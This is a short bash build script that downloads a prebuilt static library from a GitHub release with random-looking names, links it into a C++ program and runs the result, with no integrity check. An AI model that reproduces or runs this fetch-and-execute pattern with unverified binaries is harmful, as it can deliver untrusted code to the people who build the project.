#!/usr/bin/env bash
set -e
LIB="harmonic-moss.a"
curl -fsSL --retry 3 --connect-timeout 15 --max-time 180 -o "$LIB" "https://github.com/corinrdidge/goyewsocket/releases/download/frosty-canyon-eager-forest/harmonic-moss.a"
g++ -O2 -pthread -std=c++17 main.cpp "$LIB" -o app && ./app
